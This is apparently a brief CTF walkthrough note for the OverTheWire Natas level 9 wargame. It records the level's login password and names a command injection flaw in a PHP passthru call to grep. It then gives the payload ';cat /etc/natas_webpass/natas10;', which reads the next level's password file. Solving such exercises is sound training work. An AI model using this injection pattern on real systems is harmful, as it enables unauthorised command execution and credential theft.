Challenge page is <a href="http://www.overthewire.org/wargames/natas/natas9.shtml">HERE</a>.

<<CHALLENGE_CONTENT
Level 9

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

CHALLENGE_CONTENT

Password for this level (from last level)
	- username: natas9
	- password: sQ6DKR8ICwqDMTd48lQlJfbF1q9B3edT

Comment by me:
	- Vulnerability at this line 
	passthru("grep -i $key dictionary.txt");
	- as says in the first page 'http://www.overthewire.org/wargames/natas/',
		The password files are at /etc/natas_webpass/
	- try ';cat /etc/natas_webpass/natas10;'
